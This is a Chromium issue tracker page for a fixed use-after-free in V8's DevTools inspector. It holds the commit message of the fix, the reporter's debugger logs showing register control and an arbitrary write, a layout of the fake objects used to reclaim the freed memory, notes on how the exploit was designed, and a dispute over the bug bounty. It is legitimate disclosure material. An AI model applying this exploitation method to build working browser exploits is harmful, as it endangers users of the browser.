---


Expand for full commit details
```
     
    This change ensures that the InspectedContext, and thus the InjectedScript, remains alive for the duration of the InjectedScript::ContextScope. This prevents a Use-After-Free vulnerability that could occur if the context was destroyed while an InjectedScript was still being used, such as during Error.prepareStackTrace called from console.log. A new test is added to reproduce and verify this fix. 
     
    Bug: 503553614  
    Change-Id: Iec22627e2e465c6dbb094d3bd6cfaadd31b4dfb9 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7780292 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Commit-Queue: Benedikt Meurer <bmeurer@chromium.org> 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Reviewed-by: Simon Zünd <szuend@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106688}

```

---

Files:

- M `src/inspector/injected-script.cc`
- M `src/inspector/injected-script.h`
- M `src/inspector/v8-inspector-session-impl.cc`
- M `src/inspector/v8-inspector-session-impl.h`
- A `test/inspector/console/destroy-context-during-log-error-stack-expected.txt`
- A `test/inspector/console/destroy-context-during-log-error-stack.js`
- M `test/inspector/runtime/evaluate-async-expected.txt`

---

Hash: [0c247fd801af7c8c8a28f526c8e97c095b183087](https://chromiumdash.appspot.com/commit/0c247fd801af7c8c8a28f526c8e97c095b183087)  

Date: Tue Apr 21 15:14:39 2026


---

### al...@gmail.com (2026-04-25)

Attached POC exploit register control

Key findings:

- The bug is exploitable for AARW, conditional on ASLR bypass
- Current POC shows AAR + analysis below
- Exploit is not contained by v8 sandbox.

```
7:080> r
rax=0000000000000077 rbx=00001f8c008c4220 rcx=4141414141414141
rdx=000000cac91fab70 rsi=000000cac91fab70 rdi=00001f8c004c0000
rip=00007ffe1987ff0a rsp=000000cac91faa50 rbp=0000000041414141
 r8=0000000000000000  r9=000000cac88c8000 r10=00000000ffffffff
r11=fffffffffffffffe r12=000000cac91faf00 r13=000000cac91fac80
r14=0000000000000000 r15=00001f8c00125a00
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
chrome!v8::api_internal::IndirectHandleBase::value [inlined in chrome!v8_inspector::InspectedContext::context+0xa]:
00007ffe`1987ff0a 488b4108        mov     rax,qword ptr [rcx+8] ds:41414141`41414149=????????????????
7:080> kb
 # RetAddr               : Args to Child                                                           : Call Site
00 (Inline Function)     : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::api_internal::IndirectHandleBase::value [/mnt/data/code/chromium/src/v8/include/v8-handle-base.h @ 90] 
01 (Inline Function)     : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::Local<v8::Context>::New [/mnt/data/code/chromium/src/v8/include/v8-local-handle.h @ 454] 
02 (Inline Function)     : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::PersistentBase<v8::Context>::Get [/mnt/data/code/chromium/src/v8/include/v8-persistent-handle.h @ 116] 
03 00007ffe`19874eee     : 00000000`00000018 000000ca`c91fae00 00001f8c`00125a00 41414141`41414141 : chrome!v8_inspector::InspectedContext::context+0xa [/mnt/data/code/chromium/src/v8/src/inspector/inspected-context.cc @ 117] 
04 00007ffe`198744dd     : 00001f8c`00123570 000000ca`c91facb0 000000ca`c91fac90 00007ffe`19878038 : chrome!v8_inspector::InjectedScript::wrapObjectMirror+0x8e [/mnt/data/code/chromium/src/v8/src/inspector/injected-script.cc @ 663] 
05 00007ffe`198d13af     : aaaaaaaa`aaaaaaaa aaaaaaaa`aaaaaaaa 00000000`00000018 00000000`00000018 : chrome!v8_inspector::InjectedScript::getProperties+0x31d [/mnt/data/code/chromium/src/v8/src/inspector/injected-script.cc @ 475] 

```

POC usage:

1. python3 poc\_regctl.py --server-only
2. windbg -g -o chrome.exe --no-sandbox --auto-open-devtools-for-tabs --user-data-dir=c:\tmp\test-v8-inspector 127.0.0.1:8080  
   
   Tested with chrome noasan build v147.0.7727.101 (Stable).  
   
   Must be run under debugger to observe the crash, otherwise the chrome exception interceptor hides it.

Brief summary:

InjectedScript is a classic C++ object that lives on Partition Alloc default root partition. The freed object goes to 240-byte bucket thread-cache freelist. I reclaim it with Sting16 via console.time(label). The exploit is very stable: the bucket isn't high traffic, plus the bug allows for strong grasp over allocator. There is no race to win, just take the free slot.

### al...@gmail.com (2026-04-25)

Arbitrary write feasibility analysis - requires a separate ASLR disclosure bug and heap grooming:

```
InjectedScript (freed, reclaimed by spray)
  +0x00  m_context        InspectedContext*       ← READ #1  (wrapObjectMirror:662)

InspectedContext (pointed to by m_context)
  +0x00  m_inspector      V8InspectorImpl*        ← READ #2  (isolate())
  +0x08  location_        Address*  (base of m_context Global<Context>)
                                                  ← READ #3  (Get / ValueAsAddress)

V8InspectorImpl (pointed to by m_inspector)
  +0x00  vtable           (not accessed on this path)
  +0x08  m_isolate        v8::Isolate*            ← READ #4  (isolate()

```

Currently m\_context = 0x4141414141414141 and READ #2 faults at 0x4141414141414149. If this value is a valid pointer to memory that I control, then:

```
// v8-local-handle.h:227-239
Address* HandleScope::CreateHandle(Isolate* isolate, Address value) {
    HandleScopeData* data = isolate->handle_scope_data();
//                          ^^^^^^^ READ: *(isolate + 0x230)
    Address* result = data->next;
//                    READ: data->next
    data->next = result + 8;
//  ^^^^^^^^^^^^^^^^^^^^      WRITE #1: advance handle pointer
    *result = value;
//  ^^^^^^^^^^^^^^^           WRITE #2: store value in handle slot
    return result;
}

```

The isolate pointer here comes from my reclaimed object. At WRITE #2 I control both address and value via fake isolate pointer and its backing memory.

### al...@gmail.com (2026-04-29)

Adding POC AAW

As mentioned earlier, the bug requires a separate memory disclosure bug to break ASLR. The exploit uses a mock infoleak primitive patched into chrome renderer and exposed via `gm` JavaScript object (patch attached). The mock part is equivalent to a standard set of exploit primitives provided by a typical v8 type confusion bug.

```
7:078> r
rax=000000000000cafe rbx=000000000000babe rcx=000000000000cb06
rdx=00000052a6bfab70 rsi=00000052a6bfab70 rdi=00000271012a1f74
rip=00007ff93f24fe78 rsp=00000052a6bfaa40 rbp=0000000041414141
 r8=000043dc008a38c0  r9=00000052a6bfaf00 r10=000043dc008a5000
r11=0000000000000246 r12=00000052a6bfac80 r13=000043dc004fc000
r14=00000052a6bfade0 r15=000043dc000d4fb0
iopl=0         nv up ei ng nz na po cy
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
chrome!v8::HandleScope::CreateHandle+0x1b [inlined in chrome!v8_inspector::InspectedContext::context+0x38]:
00007ff9`3f24fe78 488918          mov     qword ptr [rax],rbx ds:00000000`0000cafe=????????????????
7:078> kb
 # RetAddr               : Args to Child                                                           : Call Site
00 (Inline Function)     : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::HandleScope::CreateHandle+0x1b [/mnt/data/code/chromium/src/v8/include/v8-local-handle.h @ 239] 
01 (Inline Function)     : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::LocalBase<v8::Context>::New+0x1b [/mnt/data/code/chromium/src/v8/include/v8-local-handle.h @ 309] 
02 (Inline Function)     : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::LocalBase<v8::Context>::New+0x2a [/mnt/data/code/chromium/src/v8/include/v8-local-handle.h @ 314] 
03 (Inline Function)     : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::Local<v8::Context>::New+0x2a [/mnt/data/code/chromium/src/v8/include/v8-local-handle.h @ 533] 
04 (Inline Function)     : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::Local<v8::Context>::New+0x2e [/mnt/data/code/chromium/src/v8/include/v8-local-handle.h @ 454] 
05 (Inline Function)     : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::PersistentBase<v8::Context>::Get+0x2e [/mnt/data/code/chromium/src/v8/include/v8-persistent-handle.h @ 116] 
06 00007ff9`3f244df7     : 00000000`00000000 00007ff9`4d8f4010 00000000`00000018 00000052`a6bfae00 : chrome!v8_inspector::InspectedContext::context+0x38 [/mnt/data/code/chromium/src/v8/src/inspector/inspected-context.cc @ 117] 
07 00007ff9`3f24440d     : 000043dc`000d3570 00000000`00000002 000043dc`0009c3c8 00007ff9`4ba635cf : chrome!v8_inspector::InjectedScript::wrapObjectMirror+0x67 [/mnt/data/code/chromium/src/v8/src/inspector/injected-script.cc @ 631] 


```

A note on exploit design:

Broadly, there are two options to build a renderer chain with this bug, which assume different constraints on the infoleak primitive.

A. Self-referential pivot crafted inside the `InjectedScript` object, like a matrish doll; plus, a separate allocation for the `Isolate` object that can't fit into `InjectedScript`.  

B. The original `InjectedScript` allocation is only reclaimed to point to the second fake object, which contains everything else.

Path A is somewhat more elegant, but requires a full-power AAR infoleak primitive to locate the fake `InjectedScript` in the renderer process memory.

Path B requires nothing more than a standard set of v8 addrof/fakeobj primitives for the infoleak part, if slightly harder upfront.

The distinction arises because prior to introduction of v8 sandbox, the "standard set of v8 exploit primitives" prerequisite was equivalent to an arbitrary memory read. In current chrome it is not: any reads from fake v8 objects are contained within the v8 sandbox and unable to reach Blink heap.

My exploit takes Path B to clearly show the impact of this bug class: it's not contained by any chrome exploit mitigations at all, including the v8 sandbox. The infoleak primitive stays within current v8 exploitation idioms and requires neither a v8 sandbox escape nor a special kind of bug. The UAF bug is outside of v8 sandbox by design. The chain is stable and reliable in my tests. The prerequisite of open DevTools is therefore the only constraint on the exploit impact scope.

Test platform: Chrome version 147.0.7727.101, self-built for Windows.

### al...@gmail.com (2026-05-03)

As the VRP rules just changed, I'd like to link the version of Chromium VRP rules that was active on the date when the bug and POCs were submitted: <https://web.archive.org/web/20260426200347/https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules>

### sp...@google.com (2026-05-04)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
mildly mitigated renderer memory corruption


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### al...@gmail.com (2026-05-16)

Hello,

Could you check the VRP Panel Bot decision?

[Comment #13](https://issues.chromium.org/issues/503553614#comment13) (Apr 29) includes a working PoC demonstrating arbitrary address write (AAW) with controlled source and destination values (WinDbg log: mov qword ptr [cafe], babe). Full analysis of the root cause and vulnerability exploitation was provided as well. This directly satisfies 'high-quality report demonstrating controlled write in renderer process' reward tier, which was "Up to $50,000" per the VRP rules on the date of submission ([Comment #14](https://issues.chromium.org/issues/503553614#comment14)). The Panel Bot decision does not appear to account for it.

### ar...@google.com (2026-05-18)

Note I don't make VRP-related decisions, I would recommend emailing [security-vrp@chromium.org](mailto:security-vrp@chromium.org) or [security@chromium.org](mailto:security@chromium.org) to inquire about the reward decision.

### wf...@chromium.org (2026-05-20)

[VRP Panel] thanks for your [comment#16](https://issues.chromium.org/issues/503553614#comment16) - the panel did a full and thorough reassessment here and we feel that the requirement to open devtools means this is mildly mitigated as it requires a user interaction but is "triggered by two or fewer standard user interactions" this means it is in the mitigated table and thus not eligible for the memory corruption rewards but the mitigated rewards, and the reward for mildly mitigated renderer issue is max $3000 which was rewarded in this case. I hope this explains our decision, which is final.

### ch...@google.com (2026-07-30)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/503553614)*
